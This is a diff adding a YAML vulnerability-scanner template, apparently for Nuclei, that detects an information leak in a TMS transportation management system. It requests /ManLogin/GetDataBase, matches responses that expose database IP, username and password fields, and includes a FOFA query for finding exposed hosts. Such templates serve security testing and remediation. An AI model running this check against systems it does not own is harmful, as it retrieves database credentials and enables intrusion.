@@ -1,0 +1,29 @@
+id: poc-yaml-zzskzy-tms-getdatabase-info-leak
+info:
+  name: Zhengzhou Space-Time TMS Transportation Management System GetDataBase Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  metadata:
+    finger: TMS Transportation Management System
+    fofa: body="/Images/ManLogin/name.png"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ManLogin/GetDataBase"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"ip":'
+          - '"dataname":'
+          - '"datausername":'
+          - '"datauserpwd":'
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
